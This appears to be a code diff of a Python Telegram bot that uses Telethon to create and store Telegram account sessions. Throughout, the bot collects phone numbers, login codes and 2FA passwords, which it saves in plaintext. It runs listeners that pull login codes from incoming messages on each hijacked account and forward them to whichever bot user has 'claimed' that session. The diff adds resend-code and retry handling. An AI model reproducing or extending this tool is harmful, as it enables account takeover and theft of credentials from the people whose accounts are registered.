@@ -3,9 +3,11 @@ import re
 import os
 import sqlite3
 from pathlib import Path
-from datetime import datetime
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes, ConversationHandler
+from telegram.ext import (
+    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
+    filters, ContextTypes, ConversationHandler
+)
 from telethon import TelegramClient, events
 
 # ---------- CONFIG ----------
@@ -14,7 +16,6 @@ API_HASH = os.environ.get('API_HASH', 'your_api_hash')
 BOT_TOKEN = os.environ.get('BOT_TOKEN', 'your_bot_token')
 ADMIN_IDS = list(map(int, os.environ.get('ADMIN_IDS', '0').split(',')))
 
-# ---------- PATHS ----------
 SESSION_DIR = Path('sessions')
 SESSION_DIR.mkdir(exist_ok=True)
 DB_PATH = Path('sessions.db')
@@ -32,7 +33,7 @@ def init_db():
             created_by INTEGER,
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
             is_active INTEGER DEFAULT 1,
-            status TEXT DEFAULT 'available'  -- available, claimed, expired
+            status TEXT DEFAULT 'available'
         )
     ''')
     c.execute('''
@@ -40,8 +41,7 @@ def init_db():
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             session_name TEXT NOT NULL,
             user_id INTEGER NOT NULL,
-            claimed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-            FOREIGN KEY(session_name) REFERENCES sessions(name)
+            claimed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )
     ''')
     conn.commit()
@@ -94,7 +94,6 @@ def delete_session(name):
     c.execute('DELETE FROM sessions WHERE name = ?', (name,))
     conn.commit()
     conn.close()
-    # delete file
     session_file = SESSION_DIR / f"{name}.session"
     if session_file.exists():
         session_file.unlink()
@@ -103,8 +102,8 @@ def is_admin(user_id):
     return user_id in ADMIN_IDS
 
 # ---------- GLOBALS ----------
-clients = {}       # session_name -> Telethon client
-claim_map = {}     # session_name -> user_id (OTP किसको भेजना है)
+clients = {}        # session_name -> Telethon client
+claim_map = {}      # session_name -> user_id (who gets OTP)
 listener_tasks = {}
 
 # ---------- HELPERS ----------
@@ -122,18 +121,16 @@ async def forward_otp(session_name, otp):
                 parse_mode='Markdown'
             )
             return True
-        except Exception as e:
-            print(f"❌ Send failed: {e}")
+        except Exception:
+            pass
     return False
 
 async def send_login_instruction(user_id, session_name, phone):
     await app.bot.send_message(
         chat_id=user_id,
         text=f"📱 **Login Required**\n\n"
-             f"Please login to Telegram using this number:\n"
-             f"`{phone}`\n\n"
-             f"⚠️ Once you login, I'll receive the OTP and forward it here.\n"
-             f"⏳ Waiting for OTP...",
+             f"Please login to Telegram using this number:\n`{phone}`\n\n"
+             f"⚠️ Once you login, I'll receive the OTP and forward it here.\n⏳ Waiting for OTP...",
         parse_mode='Markdown'
     )
 
@@ -141,7 +138,6 @@ async def send_login_instruction(user_id, session_name, phone):
 async def start_listener(session_name, password=None):
     session_path = SESSION_DIR / f"{session_name}.session"
     if not session_path.exists():
-        print(f"❌ Session file not found: {session_path}")
         return
 
     client = TelegramClient(str(session_path), API_ID, API_HASH)
@@ -150,17 +146,15 @@ async def start_listener(session_name, password=None):
             await client.start(password=password)
         else:
             await client.start()
-
-        me = await client.get_me()
         clients[session_name] = client
-        print(f"✅ Listener started: {session_name} ({me.phone})")
+        print(f"✅ Listener started: {session_name}")
 
         @client.on(events.NewMessage(incoming=True))
         async def handler(event):
             text = event.message.text or ""
             otp = extract_otp(text)
             if otp:
-                print(f"📩 OTP received on {session_name}: {otp}")
+                print(f"📩 OTP on {session_name}: {otp}")
                 await forward_otp(session_name, otp)
 
         await client.run_until_disconnected()
@@ -175,23 +169,21 @@ def run_listener(session_name, password=None):
 # ---------- BOT ----------
 app = Application.builder().token(BOT_TOKEN).build()
 
-# Conversation states for /create
+# ---------- CONVERSATION STATES ----------
 WAITING_PHONE, WAITING_OTP, WAITING_2FA = range(3)
 
 # ---------- /start ----------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     is_admin_flag = is_admin(user_id)
-
     msg = (
-        "🤖 **Session Bot v2.0**\n\n"
+        "🤖 **Session Bot v2.2**\n\n"
         "**Commands:**\n"
         "/create - Create new session\n"
         "/list - Show all available sessions\n"
         "/claim <name> - Claim a session (OTP comes here)\n"
         "/unclaim <name> - Release session\n"
-        "/delete <name> - Delete session (admin only)\n"
-        "/sendfile - Send .session file for verification\n\n"
+        "/delete <name> - Delete session (admin only)\n\n"
         "📂 **How it works:**\n"
         "1. Send `.session` file to bot\n"
         "2. Bot checks if session exists in database\n"
@@ -199,10 +191,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "4. You login → OTP arrives here automatically\n\n"
         "⚠️ Only registered sessions work."
     )
-
     if is_admin_flag:
-        msg += "\n👑 **Admin commands:**\n/delete <name> - Delete any session\n/stats - Show bot stats"
-
+        msg += "\n👑 **Admin:** /delete <name>  /stats"
     await update.message.reply_text(msg, parse_mode='Markdown')
 
 # ---------- /create ----------
@@ -216,36 +206,49 @@ async def create_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def create_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     phone = update.message.text.strip()
     context.user_data['phone'] = phone
-    session_name = phone.replace('+', '').replace(' ', '')
-    context.user_data['session_name'] = session_name
+    context.user_data['session_name'] = phone.replace('+', '').replace(' ', '')
+    context.user_data['otp_attempts'] = 0
 
-    await update.message.reply_text(
-        f"📲 Sending OTP to `{phone}`...\nEnter the OTP (5-6 digits):",
-        parse_mode='Markdown'
-    )
-    return WAITING_OTP
+    try:
+        client = TelegramClient(str(SESSION_DIR / f"{context.user_data['session_name']}.session"), API_ID, API_HASH)
+        await client.start(phone=phone)
+        context.user_data['client'] = client
+
+        keyboard = [[InlineKeyboardButton("🔄 Resend OTP", callback_data="resend_otp")]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+
+        await update.message.reply_text(
+            f"📲 OTP sent to `{phone}`.\nEnter the OTP (5-6 digits):\n⚠️ You have 3 attempts.",
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+        return WAITING_OTP
+    except Exception as e:
+        await update.message.reply_text(f"❌ Failed to send OTP: {e}")
+        return ConversationHandler.END
 
 async def create_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     otp = update.message.text.strip()
-    phone = context.user_data['phone']
-    session_name = context.user_data['session_name']
-    session_path = SESSION_DIR / f"{session_name}.session"
+    attempts = context.user_data.get('otp_attempts', 0) + 1
+    context.user_data['otp_attempts'] = attempts
+    client = context.user_data.get('client')
+
+    if not client:
+        await update.message.reply_text("❌ Session expired. Please /create again.")
+        return ConversationHandler.END
 
     try:
-        client = TelegramClient(str(session_path), API_ID, API_HASH)
-        await client.start(phone=phone, code_callback=lambda: otp)
+        await client.sign_in(code=otp)
         me = await client.get_me()
         await client.disconnect()
 
-        # Save to database
         user_id = update.effective_user.id
+        session_name = context.user_data['session_name']
+        phone = context.user_data['phone']
         add_session(session_name, me.phone, None, user_id)
 
         await update.message.reply_text(
-            f"✅ **Session created!**\n\n"
-            f"📱 Phone: `{me.phone}`\n"
-            f"📁 Name: `{session_name}`\n\n"
-            f"Now send this `.session` file to the bot to verify & start listening.",
+            f"✅ **Session created!**\n\n📱 Phone: `{me.phone}`\n📁 Name: `{session_name}`\n\nNow send this `.session` file to verify.",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
@@ -255,91 +258,176 @@ async def create_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if '2FA' in error_msg or 'password' in error_msg.lower():
             await update.message.reply_text("🔐 Account has 2FA. Enter your 2FA password:")
             return WAITING_2FA
-        await update.message.reply_text(f"❌ Error: {error_msg}")
-        return ConversationHandler.END
+
+        elif 'Invalid code' in error_msg:
+            keyboard = [[InlineKeyboardButton("🔄 Resend OTP", callback_data="resend_otp")]]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+
+            if attempts >= 3:
+                await update.message.reply_text(
+                    "❌ **3 failed attempts.** Use /create to restart.",
+                    reply_markup=reply_markup,
+                    parse_mode='Markdown'
+                )
+                return ConversationHandler.END
+            else:
+                await update.message.reply_text(
+                    f"❌ Invalid OTP. Attempt {attempts}/3.\nEnter correct OTP or click below:",
+                    reply_markup=reply_markup,
+                    parse_mode='Markdown'
+                )
+                return WAITING_OTP
+        else:
+            await update.message.reply_text(f"❌ Error: {error_msg}")
+            return ConversationHandler.END
 
 async def create_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
     password = update.message.text.strip()
-    phone = context.user_data['phone']
-    session_name = context.user_data['session_name']
-    session_path = SESSION_DIR / f"{session_name}.session"
+    client = context.user_data.get('client')
+    if not client:
+        await update.message.reply_text("❌ Session expired. Please /create again.")
+        return ConversationHandler.END
 
     try:
-        client = TelegramClient(str(session_path), API_ID, API_HASH)
-        await client.start(phone=phone, password=password)
+        await client.sign_in(password=password)
         me = await client.get_me()
         await client.disconnect()
 
         user_id = update.effective_user.id
+        session_name = context.user_data['session_name']
+        phone = context.user_data['phone']
         add_session(session_name, me.phone, password, user_id)
 
         await update.message.reply_text(
-            f"✅ **Session created with 2FA!**\n\n"
-            f"📱 Phone: `{me.phone}`\n"
-            f"📁 Name: `{session_name}`\n\n"
-            f"Send this `.session` file to verify.",
+            f"✅ **Session created with 2FA!**\n\n📱 Phone: `{me.phone}`\n📁 Name: `{session_name}`\n\nSend `.session` file to verify.",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
 
     except Exception as e:
         await update.message.reply_text(f"❌ 2FA error: {e}")
-        return ConversationHandler.END
+        return WAITING_2FA
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("❌ Cancelled.")
     return ConversationHandler.END
 
+# ---------- RESEND OTP (COMMAND + CALLBACK) ----------
+async def resend_otp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """/resend_otp command handler"""
+    phone = context.user_data.get('phone')
+    if not phone:
+        await update.message.reply_text("❌ No active session. Use /create first.")
+        return
+
+    session_name = context.user_data.get('session_name')
+    if not session_name:
+        await update.message.reply_text("❌ Session name missing. Use /create again.")
+        return
+
+    # Disconnect old client if exists
+    if 'client' in context.user_data:
+        try:
+            await context.user_data['client'].disconnect()
+        except:
+            pass
+
+    try:
+        client = TelegramClient(str(SESSION_DIR / f"{session_name}.session"), API_ID, API_HASH)
+        await client.start(phone=phone)
+        context.user_data['client'] = client
+        context.user_data['otp_attempts'] = 0
+
+        keyboard = [[InlineKeyboardButton("🔄 Resend OTP", callback_data="resend_otp")]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+
+        await update.message.reply_text(
+            f"📲 New OTP sent to `{phone}`.\nEnter the OTP (5-6 digits):\n⚠️ You have 3 attempts.",
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+        return WAITING_OTP
+    except Exception as e:
+        await update.message.reply_text(f"❌ Failed to resend OTP: {e}")
+        return ConversationHandler.END
+
+async def resend_otp_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Callback for 'Resend OTP' inline button"""
+    query = update.callback_query
+    await query.answer()
+
+    phone = context.user_data.get('phone')
+    session_name = context.user_data.get('session_name')
+
+    if not phone or not session_name:
+        await query.edit_message_text("❌ No active session. Use /create first.")
+        return
+
+    # Disconnect old client
+    if 'client' in context.user_data:
+        try:
+            await context.user_data['client'].disconnect()
+        except:
+            pass
+
+    try:
+        client = TelegramClient(str(SESSION_DIR / f"{session_name}.session"), API_ID, API_HASH)
+        await client.start(phone=phone)
+        context.user_data['client'] = client
+        context.user_data['otp_attempts'] = 0
+
+        keyboard = [[InlineKeyboardButton("🔄 Resend OTP", callback_data="resend_otp")]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+
+        await query.edit_message_text(
+            f"📲 New OTP sent to `{phone}`.\nEnter the OTP (5-6 digits):\n⚠️ You have 3 attempts.",
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+        # State remains WAITING_OTP
+    except Exception as e:
+        await query.edit_message_text(f"❌ Failed to resend OTP: {e}")
+
 # ---------- /list ----------
 async def list_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
     sessions = get_all_sessions()
     if not sessions:
-        await update.message.reply_text("❌ No sessions in database.")
+        await update.message.reply_text("❌ No sessions.")
         return
-
     msg = "📁 **Registered Sessions:**\n\n"
     for name, phone, status, created_at in sessions:
         claimed_by = claim_map.get(name, 'Nobody')
         status_emoji = "✅" if status == 'claimed' else "📂"
         msg += f"{status_emoji} `{name}`\n   📱 {phone}\n   👤 {claimed_by}\n   📅 {created_at[:10]}\n\n"
-
     await update.message.reply_text(msg, parse_mode='Markdown')
 
 # ---------- /claim ----------
 async def claim_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.args:
-        await update.message.reply_text("Usage: /claim <session_name>\nExample: /claim 919876543210")
+        await update.message.reply_text("Usage: /claim <session_name>")
         return
-
     session_name = context.args[0]
     session = get_session(session_name)
     if not session:
-        await update.message.reply_text(f"❌ Session `{session_name}` not found in database.", parse_mode='Markdown')
+        await update.message.reply_text(f"❌ Session `{session_name}` not found.", parse_mode='Markdown')
         return
 
     user_id = update.effective_user.id
     claim_map[session_name] = user_id
     add_claim(session_name, user_id)
 
-    # Start listener if not running
     if session_name not in clients:
         import threading
-        password = session[3]  # password from db
+        password = session[3]
         thread = threading.Thread(target=run_listener, args=(session_name, password), daemon=True)
         thread.start()
         listener_tasks[session_name] = thread
         await update.message.reply_text(f"⏳ Listener starting for `{session_name}`...", parse_mode='Markdown')
 
     await update.message.reply_text(
-        f"✅ **Session claimed!**\n\n"
-        f"📱 Phone: `{session[2]}`\n"
-        f"📁 Name: `{session_name}`\n\n"
-        f"📌 Please login to Telegram with this number.\n"
-        f"I'll forward the OTP here.",
+        f"✅ **Session claimed!**\n\n📱 Phone: `{session[2]}`\n📁 Name: `{session_name}`\n\n📌 Please login to Telegram with this number.",
         parse_mode='Markdown'
     )
-
-    # Send login instruction
     await send_login_instruction(user_id, session_name, session[2])
 
 # ---------- /unclaim ----------
@@ -347,10 +435,8 @@ async def unclaim_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.args:
         await update.message.reply_text("Usage: /unclaim <session_name>")
         return
-
     session_name = context.args[0]
     user_id = update.effective_user.id
-
     if claim_map.get(session_name) == user_id:
         claim_map.pop(session_name, None)
         update_status(session_name, 'available')
@@ -358,41 +444,34 @@ async def unclaim_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text(f"❌ You don't own `{session_name}`.", parse_mode='Markdown')
 
-# ---------- /delete (admin only) ----------
+# ---------- /delete (admin) ----------
 async def delete_session_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_user.id):
         await update.message.reply_text("❌ Admin only.")
         return
-
     if not context.args:
         await update.message.reply_text("Usage: /delete <session_name>")
         return
-
     session_name = context.args[0]
     session = get_session(session_name)
     if not session:
         await update.message.reply_text(f"❌ Session `{session_name}` not found.", parse_mode='Markdown')
         return
-
-    # Stop listener
     if session_name in clients:
         try:
             await clients[session_name].disconnect()
         except:
             pass
         clients.pop(session_name, None)
-
     delete_session(session_name)
     claim_map.pop(session_name, None)
-
     await update.message.reply_text(f"🗑️ Deleted `{session_name}`.", parse_mode='Markdown')
 
-# ---------- /stats (admin only) ----------
+# ---------- /stats (admin) ----------
 async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_user.id):
         await update.message.reply_text("❌ Admin only.")
         return
-
     conn = sqlite3.connect(str(DB_PATH))
     c = conn.cursor()
     c.execute('SELECT COUNT(*) FROM sessions')
@@ -402,74 +481,51 @@ async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     c.execute('SELECT COUNT(*) FROM claims')
     claims_total = c.fetchone()[0]
     conn.close()
-
-    msg = (
-        f"📊 **Bot Stats**\n\n"
-        f"📁 Total sessions: {total}\n"
-        f"📌 Claimed: {claimed}\n"
-        f"🔗 Total claims: {claims_total}\n"
-        f"🟢 Active listeners: {len(clients)}\n"
-    )
+    msg = f"📊 **Stats**\n\n📁 Total: {total}\n📌 Claimed: {claimed}\n🔗 Claims: {claims_total}\n🟢 Listeners: {len(clients)}"
     await update.message.reply_text(msg, parse_mode='Markdown')
 
 # ---------- FILE HANDLER ----------
 async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     document = update.message.document
-
     if not document or not document.file_name:
-        await update.message.reply_text("❌ Please send a valid file.")
+        await update.message.reply_text("❌ Send a valid file.")
         return
-
     if not document.file_name.endswith('.session'):
-        await update.message.reply_text("❌ Only `.session` files are allowed.")
+        await update.message.reply_text("❌ Only `.session` files allowed.")
         return
 
     session_name = document.file_name.replace('.session', '')
-
-    # ----- VERIFICATION: Check if session exists in database -----
     session = get_session(session_name)
-
     if not session:
         await update.message.reply_text(
-            f"❌ **Session `{session_name}` not registered.**\n\n"
-            f"Please use `/create` to register a session first.\n"
-            f"Then send the `.session` file.",
+            f"❌ **Session `{session_name}` not registered.**\nUse `/create` first.",
             parse_mode='Markdown'
         )
         return
 
-    # ----- SESSION EXISTS -----
     # Download file
     file = await document.get_file()
     save_path = SESSION_DIR / f"{session_name}.session"
     await file.download_to_drive(save_path)
 
-    # Claim automatically for the user who sent it
     claim_map[session_name] = user_id
     add_claim(session_name, user_id)
 
-    # Start listener if not running
     if session_name not in clients:
         import threading
-        password = session[3]  # password from db
+        password = session[3]
         thread = threading.Thread(target=run_listener, args=(session_name, password), daemon=True)
         thread.start()
         listener_tasks[session_name] = thread
 
     await update.message.reply_text(
-        f"✅ **Session verified & loaded!**\n\n"
-        f"📱 Phone: `{session[2]}`\n"
-        f"📁 Name: `{session_name}`\n\n"
-        f"📌 **Please login to Telegram with this number.**\n"
-        f"As soon as you login, the OTP will appear here.",
+        f"✅ **Session verified & loaded!**\n\n📱 Phone: `{session[2]}`\n📁 Name: `{session_name}`\n\n📌 Please login to Telegram with this number.\nOTP will appear here.",
         parse_mode='Markdown'
     )
-
-    # Send login instruction
     await send_login_instruction(user_id, session_name, session[2])
 
-# ---------- SETUP CONVERSATION ----------
+# ---------- CONVERSATION HANDLER ----------
 conv_create = ConversationHandler(
     entry_points=[CommandHandler('create', create_start)],
     states={
@@ -487,6 +543,8 @@ app.add_handler(CommandHandler('claim', claim_session))
 app.add_handler(CommandHandler('unclaim', unclaim_session))
 app.add_handler(CommandHandler('delete', delete_session_cmd))
 app.add_handler(CommandHandler('stats', stats))
+app.add_handler(CommandHandler('resend_otp', resend_otp_command))
+app.add_handler(CallbackQueryHandler(resend_otp_callback, pattern='^resend_otp$'))
 app.add_handler(conv_create)
 app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
 
